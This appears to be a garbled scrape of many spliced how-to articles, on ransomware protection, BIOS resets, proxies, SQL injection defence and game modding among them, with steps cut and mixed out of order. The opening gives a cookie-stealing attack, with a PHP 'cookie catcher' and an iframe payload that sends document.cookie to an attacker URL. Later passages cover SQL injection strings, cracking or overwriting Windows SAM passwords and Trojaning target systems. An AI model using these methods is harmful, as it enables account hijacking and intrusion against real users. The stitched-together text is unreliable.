, The goal of this attack is to capture a user’s cookies, which allows you access to their account for websites with vulnerable logins. You’ll need a cookie catcher, which will capture your target’s cookies and reroute them. Upload the catcher to a website you have access to and that supports php. An example cookie catcher code can be found in the sample section.

, Input a proper code into the post which will capture the cookies and sent them to your site. You will want to put in some text after the code to reduce suspicion and keep your post from being deleted.


An example code would look like<iframe frameborder=""0"" height=""0"" width=""0"" src=""javascript...:void(document.location='YOURURL/cookiecatcher.php?c=' document.cookie)></iframe>

, If you store your files with a service, like Carbonite, Dropbox, or Onenote, you’ll most likely be able to restore any files hijacked during a ransomware attack. Just make sure your cloud storage service allows you to access earlier versions of your files, so you can recover the files as they were prior to the ransomware attack.Dropbox, for example, allows you to track changes made to all files within 30 days.

, If you don’t already have one, create a consistent backup routine. If you work with important files every day, back them up on an external drive or with a cloud storage provider daily.If you save copies of all of your files frequently, you won’t have to worry about losing them during a ransomware attack.

Turn the computer on.",How to Reset a BIOS Password1," This method is for desktop computer users. Unplug the power cord from the back of the computer. Remove the case so that you have access to the motherboard. The motherboard is the main board of the computer, everything is attached to it.


Be sure that you ground yourself before touching anything inside your computer, otherwise you might short a component.;
, There are dozens of jumpers on the motherboard, so be sure that you are locating the correct one. Refer to your motherboard’s documentation to double-check. The jumper covers two of the three pins that control the BIOS password.


The jumper may be labeled CLEAR CMOS, CLEAR, CLR, JCMOS1, PASSWORD, PSWD, etc.
The jumper is typically located on the edge of the motherboard or physically near the CMOS battery.

, To reset the BIOS password, you will need to move the jumper that is covering two of the three pins. On most systems, moving the jumper over one pin will change it. For example if the jumper is covering pins 1 & 2, move it so that it is covering pins 2 & 3.


Some systems will reset the password if the jumper is removed completely.

, After booting, the BIOS password should be cleared. Turn the computer back off and replace the jumper to its original position. Replace the case and the computer is ready to be used again.

Install a dedicated ransomware blocker.,
Update your security software regularly.,
Use a pop-up blocker.,
Keep your browser updated.",How to Protect Your Computer from Ransomware2," In addition to an antivirus service, you should install a utility that specifically protects your machine against ransomware. Two well-reviewed free options are Cybereason Ransomfree and Malwarebytes Anti-Ransomware.Recommended paid versions include Bitdefender Antivirus Plus 2017 and Webroot SecureAnywhere Antivirus. A one year subscription for each service costs less than $20 (US)., Your operating system's security suite, antivirus utility, and ransomware blocker won’t be effective unless you update them regularly.Nearly all ransomware attacks have targeted Windows, but a few have affected macOS. Regardless of your machine's operating system, install updates whenever they're offered.If you use Windows, click on the Control Panel and make sure your Windows automatic updates are enabled.

If your machine runs macOS, go to System Preferences and select the App Store icon to modify your update settings. You can opt to automatically install system updates alone or auto-update apps as well.

, Ransomware hackers can embed malware in advertisements on websites you’d otherwise trust. Enable a pop-up blocker on whichever browser you use to decrease your risk of clicking on a malicious advertisement., Install your browser’s updates and patches whenever they’re released to keep it as secure as possible. Like your operating software, your browser periodically releases updates that contain security patches.Your browser's pop-up blocker and unprotected website detector need to be updated in order to be effective.

Avoid opening suspicious emails and links.,
Check the file extension before opening an attachment.,
Avoid unprotected websites.,
Disconnect immediately if you’ve opened a suspicious file.",How to Protect Your Computer from Ransomware3," Ransomware typically spreads through malicious links or attachments sent via email. Stay alert, and never open an email, attachment, or URL that seems suspicious.For the best chance at staying secure, just don’t open anything from a company you don’t do business with or from someone you don’t know. If you have any doubts, don’t click it.
If you get an email with a subject such as “You’ll never believe this!” from a friend, you should send them a text or phone call to see if they actually meant to send the email.

, Before opening any attachment, you should make a habit of checking its file extension, which is the .doc, .pdf, or other abbreviation that’s listed after the filename. Before opening an attachment, right click on it and select the option to scan for malware from the drop-down menu.Avoid opening .exe files, or executable files, since they can run a ransomware application. If you do need to exchange .exe files legitimately, share them using a cloud service or in a password-protected ZIP file.

, Whenever you visit a website, make sure you see “https” at the beginning of its address. The “s” stands for secure, and indicates that the website is encrypted.If your session isn’t encrypted, any account that you sign into could be vulnerable. To protect your information, enter your passwords only into encrypted pages, avoid staying permanently signed into accounts, and use a different password for each account., If you’ve clicked on something suspicious but a ransomware screen hasn’t yet appeared, disconnect from Wi-Fi or unplug your wired connection immediately. Encrypting files to hijack them takes some time, so if you act quickly you might be able to stop the ransomware application before it finishes.Disconnecting your machine can also help protect other computers on your network. In addition to disconnecting the infected computer, you should disable Wi-FI and Bluetooth on all machines within your network."

Determine if you can access your CMOS jumper.,
Turn on the laptop.,
Take note of the displayed number.,
Generate a password.",How to Reset a BIOS Password2," Laptop users will typically be unable to access the jumper. If you are using a laptop, you will need to use a backdoor password instead. These passwords are encrypted, but can be decrypted by running special key generating scripts.

, When prompted for the password, guess three times. This will lead to the System Disabled screen. Don’t worry, the system is not actually disabled, it will boot up again when the power is reset.

, You will need this to generate the BIOS backdoor password. The series may contain letters as well as numbers.

, On a working computer, visit this site and enter the code from the laptop. The program will generate a password for you. This may take a few minutes.


Some laptops use the serial number of the laptop itself to generate a password. Refer to the table on the More Details section in the above website to see what numbers to input.

Open the computer.,
Locate the CMOS battery.,
Replace the battery.",How to Reset a BIOS Password3," This method only works on desktop computers. Make sure that the computer is turned off. Remove the case from your computer so that you can access the motherboard. Unplug power cable from the back of the computer so that no power is reaching the desktop.


Be sure that you ground yourself before touching anything inside your computer, otherwise you might short a component.

, The CMOS battery is round and silver, much like a watch battery. Carefully remove it from its housing. Wait for 5-10 minutes so that all of the power stored in the capacitors on the motherboard can discharge.


You can bypass the wait time by moving the CLR_CMOS jumper to the 'clear' position while the battery is removed. If you do this, it will automatically discharge the capacitor that is storing backup power to the CMOS chip.

, All of the BIOS settings will be reset the next time that you turn the computer on. You will need to reset the time and date in the BIOS setup menu.

Stop using your computer immediately.,
Try plugging your hard drive into a different port or computer.,
Know the different components of a hard drive.,
Assess the sounds your drive was making.,
Refrain from using do-it-yourself quick fixes.,
Understand that hard drive recovery is a job for professionals.,
Expect to pay a lot of money for the repair.,
Find the repair company that best suits your needs.,
Pick a company and stick with it.",How to Recover a Dead Hard Disk," If your hard drive is still spinning but you're encountering performance issues, it's best to stop the hard drive from running as soon as possible. Once you've turned off your computer, don't turn it on again until you can take it to a professional repair service.


If you're worried about an external hard drive malfunctioning, you can simply unplug it from your computer.;
, If you can get your hard drive to work on a computer other than the one in which it currently resides, the problem isn't necessarily with the hard drive itself--it's with the cables or the ports on your computer.


If you're using an external hard drive, this is as easy as unplugging it from your computer and plugging it into a different one. You'll also want to try a replacement cable in case the old one is malfunctioning.
Internal hard drives present a more complicated problem. In order to diagnose your internal hard drive's connection health, you'll first need to remove the drive from your computer. After doing so, you can buy a hard drive docking station or a USB cable converter (Amazon sells both) that allows you to connect your external hard drive to another computer.
Before removing a hard drive, make sure your computer is unplugged and the battery is disconnected (if applicable).
Removing a hard drive is an incredibly difficult task on a Mac. If you intend to do so anyway, proceed with caution.
In rare cases, a hard drive failing to work on your specific computer (but working on others) can be symptomatic of a failing motherboard. If you can get your hard drive running on any computer other than your own, you should take your computer into a tech company somewhere to get it checked out.

, Hard drives have three distinct components that are likely to cause a drive failure if they malfunction:PCB - The circuit board (usually on the bottom of your hard drive) controls most of your hard drive's functions, as well as translating hard drive information into readable information. Circuit boards are typically green.

Platters - Thin disks that store data. Platters are responsible for most of the noise you hear when your hard drive starts up. Unless you're a professional with access to a clean room and the necessary equipment, you won't be able to fix your hard drive's platters on your own.

Head Assembly - The head assembly is what reads the data off of the platters. Again, you won't be able to repair the head assembly without professional-grade experience and equipment.

, Depending on what's wrong with it, your hard drive will make certain sounds. Be sure to cross-reference your hard drive's model with the sound it's making to ensure an accurate diagnosis.


For example: if your hard drive was making a clicking noise, it most likely has a problem with the head assembly.Unfortunately, most problems that are diagnosable by the sound they cause will need professional care.

, These include things like freezing your hard drive or applying force to it. While some users may report success from these methods, performing a short-term fix on your hard drive is bound to make successful data recovery from a professional service even less likely than it already was.


Even if you can get a quick fix to work, the effects are usually short-term. Your hard drive will still end up dying., Due to the incredibly complex construction of a hard drive, you won't be able to fix your own drive to the point of being able to retrieve the data stored on it unless you have an advanced background in electronics. For this reason, you should hand your hard drive over to a professional repair service.


Attempting to fix a dead hard drive will only lessen the chances of a professional being able to repair it.
Even replacing the PCB board is an advanced exercise that requires knowledge of how to solder circuitry and purchase exact part replacements.

, True hard drive recovery entails the use of clean rooms, specialized equipment, and highly trained personnel. As such, you'll likely spend over a thousand dollars getting your hard drive's information back., You can usually find drive recovery services through your local tech outlet, but a couple of outstanding options include the following:Best Buy - Best Buy's ""Geek Squad"" branch handles data recovery. You can expect to pay anywhere from $200 to a little under $1500, depending on the severity of the hard drive's damage.Drive Savers - Drive Savers is a 24/7 customer service-based data recovery company with 30 years of experience. In addition to computer hard disk recovery, they can also recover smart phone and camera hard drives.

, Each time someone opens your hard drive and tries to fix it, the probability of it actually getting fixed decreases. This is because opening your hard drive renders it susceptible to things like dust, static electricity, and other environmental hazards. To minimize the risk, you should avoid asking for multiple consultations from different companies. To be sure of the company's competence, inquire what kinds of data recovery tools they use. If they use PC3K or DeepSpar, that is a good sign.

Select “save,” “apply,” or “reboot.” Choosing one of these options should automatically reboot the router and reconnect you.,
Wait for restart.,Bookmark these steps.",How to Reboot a DSL Modem Remotely1," Open up an internet browser on your computer. It could be Internet Explorer, it could be Firefox, it could Chrome. It does not matter. What does matter is that you are able to type an address into the web browser URL.;
, An Internet Protocol or IP address is an identifying number that computers use to send data over a network.You will have to type your router's IP address into the web address field. Often it is http://192.168.1.1 or something similar. Try this as a default IP address.


If the default fails, you can locate the router's IP address by launching a command prompt (in Windows) and entering “ipconfig.” Do this by clicking the “Start” button, then choose “All Programs,” “Accessories,” and lastly “Command Prompt.” This will tell you the correct IP address under “default gateway.”Another way of doing this is click “Start” and “Control Panel.” Then select the option “Network and Sharing Center.” Here you should find the name of your network and click “View Status.” If you ask for “details,” the computer will then give you a series of numbers. The router's IP address is listed as the “IPv4 Default Gateway.”, At this point you will need to enter your network administrator name and password. You cannot access the router settings if you do not have administrator access. If using your home computer, this should not be a problem and the router may even be using its default name and password. You can find often this these the user's manual or on a sticker on the router itself. , Although every router and modem is slightly different, they all should have a “settings” or “management” tab that you will be able to access as the network administrator. This tab should come up automatically on your web browser and should have an option to launch a reboot under its “basic settings.”, Make sure that you do not make any other changes to the router in basic or advanced settings, however, at the risk of causing further problems. In case of a mistake, you can usually restore the router to its factory settings by physically hitting its reset button., It might then take a bit of time for the router to regain its functionality. The screen will refresh automatically when almost done. The reboot will not be complete until your computer says that you have internet connectivity.

, You can bookmark your IP address as a shortcut. This will save you from having to repeat the above steps again should something go wrong. Save the URL as a bookmark immediately after clicking OK. It should be something like http://192.168.1.1/htmlV/reset.asp?restart=TRUE

Models like iBoot can be purchased at computer stores or online and generally cost around $200., Remote power switches are made to hook directly to your principal PC. Plug the computer's power cable as well as its internet cables into the device. Hooking up your computer will allow you to control certain functions on all other computers on your network, remotely, and to even automate these functions., Once you have hooked up your computer, set up the remote power switch so that it automatically monitors internet connectivity and will reboot the router in case of a failure. You should be able to do this by accessing the device settings on your desktop. You can also schedule it to reboot regularly, every morning or every other morning, for example., Remote power switches work automatically once you set them up. If your router is giving you problems, the device will automatically detect it and reboot the router, leaving you with fewer worries.

, As before, once the router has rebooted it will take some time for it to regain its usual functionality. You should be able to access the internet again in several minutes.

Alternately, you can browse an IP address identification website for the address. It will be in the format xxx.xxx.xxx.xxx. Other websites can then tell you what organization uses the Public IP address as well as give the service provider's name, address, and telephone number., If you are unable to do reboot your router using the first two methods, or if you are having chronic problems with internet connectivity, contact your service provider over the telephone and report the problem. As there may be an underlying issue that needs to be fixed, you will need to speak with the provider's customer service representatives and also identify yourself and details about your internet account., If your ISP supplied the router that you are using, chances are good that they can access it remotely through the so-called TR-069 or CPE WAN MGMT Protocol. This is a protocol that broadband companies use to remotely manage and troubleshoot customer devices like modems, routers, and gateways. It is very possible that they can reset the router for you., It possible, it still may take a while for your ISP to reboot the router. Be patient. Once the reboot has taken place, your router should return to functionality and connectivity within a few minutes.

Try opening the Task Manager.",How to Recognize a Computer Virus Infection2," If your regular programs start crashing more frequently, a virus may have infected the operating system. Programs that take longer to load, or that perform extra slow, are also indicative of this.

, If you have a virus infection, you may start seeing messages appear on your screen, even if no other programs are running. These can include advertisements, error messages, and more.


Viruses can also change your desktop wallpaper without permission. If you find yourself with new wallpaper that you didn’t select, chances are you have a virus.

, If you get constant messages about a program requesting access to your firewall, that program may be infected. You are receiving these messages because the program is attempting to send data through your router.

, Viruses often delete your files and folders, or changes are made without your consent. If your documents are disappearing, there is a good chance that you have a virus., Your web browser may open new home pages, or not allow you to close tabs. Popups may appear as soon as you open your browser. This is a good sign that your browser has been hijacked by a virus or spyware.

, If you have a virus, your mailing list may be receiving messages that you did not send. These messages often contain more viruses or advertisements. If you hear that others are receiving these from you, you most likely have a virus.

Usually these back doors are present in URL query strings and form inputs, such as Login forms, Search forms, or other user input textboxes that can communicate with a database.,

Generally, a hacker can enter bogus characters into the URL querystring or a textbox. The bogus input is then interpreted as SQL rather than ordinary user data and is executed by the unsuspecting database. As a result, the website may break and display an error, allowing the hacker to glean private information about the database. Even worse, the hacker's hazardous scripts may actually be executed on the database, causing security breaches and/or permanent damage.

,

The first goal of a hacker is to repeatedly try to break a website, causing it to display a variety of valuable errors that give away private database details. In this way, he can gain insight into the structure of the database and ultimately create a map or footprint of all its tables and columns. The second goal of the hacker is to actually manipulate the database by executing scripts in malicious ways. With control over the database, the hacker may possibly steal credit card numbers, erase data or infect it with viruses, among other nasty things. In essence, the URL querystring and textbox are the two back doors into a database. Getting errors and manipulating the back doors are the two methods used by hackers to ultimately destroy a database.

,

Let's look at how a hacker might go about breaking into a website. Using the first technique described, he can hack the URL querystring and cause an error to be displayed. You can do a simple test to hack into your own website via the URL querystring. All you have to do is type something else directly into the address bar at the end of your query string.

,,,,,,,,, After generating a series of these kinds of valuable errors, a hacker can piece together private database details which will ultimately help him break into and wreak havoc on the database.,, This way, a hacker will never see any detailed error messages. If you do nothing else, this is the number one thing that every website must have. Otherwise, you are giving the hacker an open invitation into your database and practically offering him all the information he needs to launch an attack.,, To setup your own custom error page, you will need to consult your web host for instructions. Generally, you will create a new HTML page to look the way you please and that says something short and sweet, like 'Sorry, the page you have requested is unavailable.' Then save it as error404.htm and upload it to your server. Following the instructions from your host, you will change the website settings to point to the new error page. This will stop many hackers right in their tracks.,, In an effort to execute malicious scripts on a database, a variety of creative coding is employed, such as %20HAVING%201=1 or maybe %20;shutdown with no wait-- or much worse. Once the hacker is able to execute scripts, the vulnerable database is like putty in their hands. The hacker never has to know the database login or connection string because he is using the URL querystring which already has an open connection.,,,, A hacker may manipulate any textbox within an HTML form. A search box or a login form with username and password fields are all prime targets. The hacker can enter bogus characters into the textbox and submit the form. The input is then interpreted as SQL rather than ordinary user data and executed by the database. Again, this attack will either cause an error so he can glean private information about your database, or it may actually insert hazardous scripts and wreak havoc on the database.,,,, The number one way to block a hacker from manipulating the URL query string and textboxes is to block their input. But, how do you determine who they are, what they will input and whether or not it is safe? Unfortunately, you cannot know. So, you must assume that all user input could be potentially dangerous. A common saying in the programming world is that ALL INPUT IS EVIL. Thus, it must be treated with caution. Everything from everybody should be checked every time to ensure dangerous code does not slip in. This is accomplished by checking all input that is submitted via a querystring or form and then rejecting or removing unsafe characters before it ever reaches the database. If this sounds like a lot of trouble, you are right. But, it is the price we pay to protect our websites and databases from the wrath of hackers. It is your responsibility as the webmaster to ensure that only clean, safe input is allowed to enter your database.,, In other words, using ASP code on a web page can validate the input collected from the querystring or form to make sure it contains only safe characters. Once the input is deemed safe, it can be stored in a new variable, inserted into the SQL string and sent to the database. For more details about validation,,, We want to thoroughly clean all input by first checking for safe characters and second by checking for bad strings. See the resources at the end of this article for a more in depth discussion on this method.,,, Following is an ASP example that renders the single quote harmless, by replacing it with two single quotes.,,, Or, filter out characters such as the dollar sign $ quotation mark "" semi-colon ; and apostrophe ' the left and right angle brackets <> the left and right parentheses ( ) the pound sign # and the ampersand &. Or convert these characters to their HTML entities.,, Remember a hacker can easily save a copy of your webpage, then modify the HTML and javascript, then re-upload the page. Therefore, it is best to never use javascript alone for input validation since it can easily be removed, and instead duplicate any java script validation with ASP validation. Also, hidden input fields are a threat in the same way since they can easily be altered to include bogus code. Other tips include: Never give away any clues about your database, including making your input field names the same as the database field names. Always set a max length for inputs and truncate the excess., Topics discussed include, password policies, buffer overrun, creative table and column names, table name aliases, set and check data types, .bak files, stored procedures with parameters, and log files."

Determine if you want to make a land line or a cell phone.,
Wait for a dial tone if you are using a land line phone (assuming you are not using a rotary phone).,
Use a cell phone to make a call anonymously if a land line phone is not available.,
Determine if your cell phone has an option to hide your number to the recipients of your calls.,
Ensure, if at all possible, that the individual you are trying to reach has not implemented an available feature called ""Anonymous call rejection.""",How to Make an Anonymous Call,";
, When you hear the tone type ""*67"" before you make a call. You will hear a double dial tone to let you know that you have now restricted your call without revealing your identity to those you are calling.

,


Before entering the number type ""*67"" just as you would if you were making an anonymous call from a land line phone. However, you do not need to wait for a double tone before entering the rest of your number as when using a land line phone.






Before entering the rest of the number in your cell phone make sure you enter ""1"" before the area code (some companies don't require dialing the 1 after ""67"", so if it doesn't work with the ""1"" try it without), a step which can be easily forgotten as it is typically not necessary when making calls from a cell phone. Instead of your cell phone number showing up on the caller ID of your call recipient's phone, the word ""Restricted"" will show up instead.







,


All cell phones are different, but some may offer an option to hide your number as a default setting for all calls. Check with your wireless provider if you are not sure how to implement this setting on your phone.







, While this is not available for cell phones it is an available feature on landlines through phone providers.


If you try to make an anonymous call to a number with this feature implemented a pre-recorded message will be played alerting you that the person does not accept anonymous calls. To reach this person you will need to call back without hiding your phone number if that is an option.






While this can be a useful tool to implement it can also screen out desired calls from callers that typically hide their numbers, such as doctor's offices, a police officer, or other offices or individuals who have a legitimate reason for consistently hiding their number.

Take the username and password obtained and ""Trojan"" the system.",How to Think Like a Big Hacker," Consider the size of the target, the number of potential entry points and the security mechanisms that may be in place. A hacker should think about company names and subsidiaries, phone numbers, domain names and their IP networks.;
, For example, identify startup companies that most likely have weak security, especially those recently acquired by large companies. Hacking into these smaller companies may provide information about the unrestricted virtual private networks the larger target companies.

This code can allow a hacker to become an administrator in the system, so that the next time that the hacker logs on, they will automatically be added to the administrators' group and will have instant access to ""admin only"" information.

Well, to do this you have to have a basic idea of how passwords are stored.,
Now, where can you find this SAM file?,
""If it is locked, how do I get it?"",
""Now I have it, but the password is encrypted!"",
It outputs password, and you are done!

,
Also, another awesome trick is injecting passwords into the SAM.

,
The easiest way to gain access is simply to use a tool called chntpw to change a password in the SAM,(after you back it up using Linux), and then simply log in, do what you have to do, then restore it.

,
There you go, a quality hacking tutorial.",How to Use the Sam to Hack Windows," First, when you type it in, it is encrypted into something long and unrecognizable. Then it is stored in a file called the SAM.;
, Well, to be blunt, it is here: Windows/system32/config/SAM. But, don't go for it just yet! It is locked to all accounts while Windows is running. It can also be found in the registry under HKEY_LOCAL_MACHINE -> SAM.

, Well, the easiest way to do this is to get an alternate OS like Linux, and copy the file. That simple. You can also use a program called pwdump2, which will get it as well.

, Now you get to the fun part, cracking the password. There are numerous programs available, but one of the best ones is called Cain, and can be downloaded from www(dot)oxid(dot)it/cain(dot)html.

Understand the basic concepts of a proxy.,
Know the different types of proxies.",How to Use a Proxy1," A proxy is a server that you connect to that allows you to get “outside” of your network. You connect to a proxy and route your traffic through it, so that your IP is masked and traffic appears to be coming from the proxy server.;
, There are several types of proxies that you will run into as you research proxies. Each offers a certain degree of anonymity, and some are more secure than others. There are four main types of proxies:


Web-based proxies: The most common and easiest to use proxy. These are servers that you connect to through a browser do visit a visit a website anonymously.
Open proxies: These are proxy servers that are either accidentally left open or are hacked. They are often not secure and can contain malicious software. It is recommended that you avoid open proxies.
Anonymity networks: These are private networks that are run by users donating bandwidth. They are often incredibly slow and due to the fact that anyone can host bandwidth, they are fairly insecure.
VPN (Virtual Private Network): These are private networks where you directly connect to a proxy server maintained by a proxy company or organization.

Find a list of proxies.,
Choose a proxy site.,
Select the URL box.",How to Use a Proxy2," A web-proxy is useful if you aren't on your own computer because all the work is being done through the browser, so the method works regardless of your computer's operating system.


There are several websites that list proxies that you can use. Proxy.org is a great place to start that is constantly updating its list.
There's a good chance that proxy listing sites like Proxify will be blocked by a school or work network. Visit the site at home and make a list of 10-15 proxy sites to try at the blocked computer.
Proxies that are overused get noticed and blocked, so vary which ones you use on a day-to-day basis.
Using a proxy will make browsing significantly slower. This is because the traffic is rerouted through the proxy, reinterpreted and then sent to your location. Be aware that videos and websites may take longer to load.

, If the site is blocked, try a different one. When picking sites from a list of proxies, try using sites that are geographically closer to your location. This will help minimize the loss of speed.

, Enter the address of the website you wish to visit. Since proxy sites reinterpret the data of website you are trying to access, there's a chance that the site won't load correctly. Most commonly the video will not load. If this is the case, try again with a different proxy site.

Download and install VPN (Virtual Private Network) software.,
Manually set VPN settings.",How to Use a Proxy3," You will need administrator access on your computer to do this. Most VPN software requires a subscription. In return you gain access to thousands of anonymous IPs that you can use.


VPNs offer much higher levels of encryption than web-based proxies.
VPNs work with all internet traffic on your computer, as opposed to web-based proxies which only work through the browser. This includes messaging and file transfers.

, If you’d rather not download the software, and would instead manually enter the connection details for your VPN, you can setup the VPN from the Windows control panel. Select Internet Options. You will still need to obtain an IP to connect to.


In the Connections tab, click Add VPN. This will open the VPN window. Enter in the IP that you are connecting to.

Ensure physical security.",How to Stop Hackers from Invading Your Network," It is always a good idea to follow hacking forums as you will be able to pick up on all the latest methods being used. A good ethical hacking forum can be found at http://zerosecurity.org;
, Some software have built-in passwords to allow the first login after installation; it is extremely unwise to leave it unchanged.

, Install proper scanning software programs to identify all entry points from the internet into the internal network of the company. Any attack to the network needs to start from these points. Identifying these entry points, however, is not at all an easy task. It is better to take the help of skilled ethical hackers who have taken special network security training to perform this task successfully.

, By running the attack and penetration tests, you can identify those vulnerable points in the network that can be easily accessed from both external and internal users. After identifying these points, you would be able to thwart attacks from external sources and correct the pitfalls that could become the entry points for intruders to hack into your network. The test must be done from both the internal as well as external perspectives to detect all the vulnerable points.

, All possible steps must be taken to make all the users of the network aware of the pitfalls of security and the necessary security practices to minimize these risks. You can conduct social-engineering tests to determine the user awareness. Until all the users are aware of certain factors related to the network, protection cannot be carried out in the true sense of the term.

, A firewall, if not configured properly, can act like an open door for any intruder. Hence, it is vitally important to set the rules to allow traffic through the firewall that is important to the business. A firewall must have its own configurations depending upon the security aspect of your organization. From time to time, proper analysis of the composition and nature of the traffic itself is also necessary to maintain security.

, Use strong password policies by having passwords of seven characters which are of secure length and relatively easy to remember. Passwords must be changed every 60 days. The password should also be made up of both alpha and numeric characters to make it more unique.

, Regardless of the policies above, passwords are less secure than SSH or VPN keys, so think about using these or similar technologies instead. Where possible, use smart cards and other advanced methods.

, Comments used in source code may contain indirect information that can help crack the site and sometimes even usernames and passwords. All the comments in source code that look inaccessible to external users should also be removed as there are some techniques to view the source code of nearly all web applications.

, You will not be dependent on reliability of the modules you actually do not use.

, They may be a weak point to attack; as they are the same in many systems, the cracking experience can be easily reused.

, Both intrusion detection systems and anti-virus software must be updated regularly and, if possible, on a daily basis. The updated version of anti-virus software is necessary as it helps in detecting even the latest virus.

, Apart from ensuring the internal security of the network, you need to think about the physical security of your organization. Until and unless your organization has full security, any intruder can simply walk into the premises of your office to gain whatever information s/he wants. Hence with technical security, you must also ensure that the physical security mechanisms of your organization are fully functional and effective.

With hackers and crackers constantly trying to foil each other, you need to be as secure as possible. You need to protect your information and data as much as possible. That includes digital and physical information. There have been many cases where a person has suffered the consequences of something as simple as using the same user name across the web or even using their real name online. Some data you should protect includes the list items below. Tips for doing these are provided in the Tips section at the bottom. If you need further information, a simple search will be able to help.

, If someone tells you to open the Bash terminal said you have an RFI vulnerability, you may be confused. If you don't know what a word or phrase means, don't be afraid to look it up., Linux is great for security purposes. With many distributions to choose from, you can find one to fit your purposes. Linux distributions are typically secure and give you more accessibility for hacking.


The below image may appear as alarming and contrary to it being secure, but there are hundreds of Linux kernels. Some are designed to be vulnerable so hackers can practice cracking.

, Metasploit and msfvenom are tools designed by Rapid7 and contributors for the purpose of exploitation. Metasploit itself is an Exploitation framework. It has hundreds of exploits for usage on multiple operating systems.

, You may start with languages such as Python or Ruby to get started. This will help you get a grasp on concepts and even terminology. These languages are also very useful.



Codecademy is a useful interactive site designed to help people learn about coding. Also, get books from your library or order them online.

, The Bash command line is the terminal used by Linux distributions. It will come in handy when you need it. Codecademy also has a course for this labeled ""Learn the Command Line.""

, Nmap is a tool used in networking tests such as port scans, host detection, service scans, and much more. Digital forensics such as this come in useful to locate potential exploits in a remote machine.

, There are so many ways you can be tracked that you may not be aware of.

Knowledge: the first step in protecting your data is to understand the nature of what protects it.,
Archiver: What one would need to seek out is an archiver with build in encryption standards.,
Installation/Use: After downloading 7zip run the executable in your default download directory.,
Creating a crack proof archive: The new menu that you opened in step 3 will be the control panel for your new archive.,
Key Strengthening/Archive strength: The strength of your new archive will depend squarely on the password you put into the two fields in the encryption box.",How to Make a Crack Proof Archive," In this article a folder will be compressed to store your information. The only difference between this ""archive"" and others is that this one will have to be protected with an encryption standard. This container will have a password that will link itself to an algorithm. That means that the only feasible way to get into the archive will be to enter the password. Knowing this a concerned user would ask the following questions and receive the following answers:

Q: Is my data safe in this container?
A:The safety of your archive will depend squarely on the algorithm used to secure it. For example; AES-256 is safe, Win-ZIP 8 is not.



 


Q: In its encrypted state, is my data still stable?
A: Normally yes, however some compression standards can and sometimes will make your compressed archive unstable. Such is the nature of some KGB compressed archives and also on rare occasions .rar files. However KGB archives have been confirmed to store 3.2 GB of information in a 64kb file.






Q: Is there a chance that my data will become unrecoverable?
A: This would depend on the compression standard. For the purpose of this article simple ""storage"" based compression is suggested. With very little compression there is very little chance of degradation.





;
, A good example comes forward in 7zip . This free program can protect your data with a 256 bit AES encryption and has the added ability to open a great diversity of archives. Other archivers have similar capabilities however, for a crack proof archive one would need the added security of a government level encryption. For our purposes AES through 7zip will do nicely.

, Click your way through to a clean installation and simply go to your desktop. Use your mouse to right click your desktop. Go to new/folder. This will create a new folder on your desktop. Now right click that folder. You will notice a new option has been added to your right click menu. Go to 7-zip/add to archive. Now the new window will lead directly to step three, creating your crack proof archive.

, Primarily there are three boxes that will need to be changed in order for the encryption to work.

Archive Format: This will need to be changed to ""7z"".






Compression Level: This will need to be changed to ""store"".






The Encryption Box: This is where you will enter your desired information. See step 4.







, AES-256 encryption can be an incredibly weak standard for those who use a weak password. A weak password can be broken in the hours to days margin. A strong one cannot be broken, or at the very least is unfeasible to try to crack. To understand what makes a password weak on must temporarily enter into the world of cracking. AES-256 is strong algorithm and can't be broken in and of itself. However A cracker will use a computer to try every word in one or several dictionaries to see if one of those words is a password to your archive. When that doesn't work he will then try every possible combination of letters to find out what your password is. This method will guarantee success given a certain amount of time and computer power. In fact if your password was 5 digits long it would only take this cracker a year to crack your archive with a single computer. The same process would only take the NSA several minutes. However, if you lengthened your password to 25 digits not even the government would be able to crack your archive in this manner. That is assuming that your new password is a combination of numbers, symbols and letters. That means that you may have to do some memorizing. The only other ways to get your password would be through you, your ram, or through a key logger. The Ram method is the only confirmed weakness in AES and is referred to as a cold boot attack. In short, after one opens their archive the password is saved in your computers ram. If that password were retrieved before five seconds of elapsed off time occurred it is then possible to retrieve the password. In short turn your computer off and data is still roaming around for 5 seconds, that means until that five seconds is over your password is still in there. In the end a strong password is the key to AES strength, to further improve the strength of your archive see the tips and warnings sections bellow.

44 = Long, dirt track going from bumpy to normal
45 = Half paved bump without end wall
46 = Paved tunnel
47 = Long, paved track with starting blocks
48 = Long, dirt track with starting blocks


chk(a,b,c,d)x- creates a checkpoint.,
Note: When setting a track piece the x-coordinate and y-coordinate refer to the centre of the piece.,The track file seems happy to accept comments if preceded by a hash eg # a comment

",How to Hack Need for Madness," This can be done at www.arcadetown.com(go to racing games and choose Need for Madness, press download now).;
,, To change music, go to step 4. To change stage laps, go to step 6.

,, These are the compressed files for each stage (you can obviously see that). To change music files use WinZip, IZArc, or another unzipping program to open it. You can also right-click and select Extract all... then go through the steps to extract it. Now, you should see music files inside them in mod format. So if you wanted to make stage 4 music be stage 5 music, you would copy the file in it and paste it in stage 5 folder and rename it to ""stage5.mod"". Be sure to delete the original file. If you want to change it by a music that is not existing there then you can use a mod converter to convert it to mod and then rename it to stage#.mod and add it to the zip file. If it asks to replace the file then do so., If you can find the right kind of MPEG to convert a video to (the audio part of the MPEG), then you can put in your own music.

, Each stage is saved in a text file written in a special script. To edit a stage, open that stage's text file. Here is a list of the commands (note: the letters a, b, c, etc. are what you change):

, It appears near the beginning of each file.

,, a is the piece type, b is the x-coordinate (from your starting point), c is the y-coordinate (from your starting point), d is the rotation (in degrees), and e tells the computer controlled cars what type of piece it is (type p for a straight piece, pr for a jump, pt for a turn, ph for a quarter pipe, etc.) The types are




0 = Tornado Shark statue
1 = Formula 7 statue
2 = Wow Caninaro statue
3 = La Vite Crab statue
4 = Nimi statue
5 = MAX Revenge statue
6 = Lead Oxide statue
8 = Radical One statue
9 = DR Monstaa statue
10 = Long, paved track

12 = Long, paved track at an angle to the right
13 = Long, paved track at an angle to the left
14 = Paved track with a right curve
15 = Long, dirt track
16 = Long, grass track
17 = Dirt track with a right curve
18 = Long, dusty paved track
19 = Dusty paved track with a right curve
20 = Long, track going from dirt to paved
21 = Medium length track going from dirt to paved
22 = Short, track going from paved to dusty paved
23 = Short, paved track with an end facing back
24 = Short, dirt track with an end facing front
25 = Paved, track segment
26 = Medium sized, ramp
27 = Medium sized, paved ramp with walls
28 = Full, paved bump
29 = Half bump: low and high
30 = Paved bump; half

40 = Blue Checkpoint
41 = Fixing Loop
42 = Black Checkpoint



, Works the same way as set.
fix(a,b,c,d,e)x- creates an electrified hoop. Same as for set and chk, except that d is the height(it has to be negative) and e is the rotation.

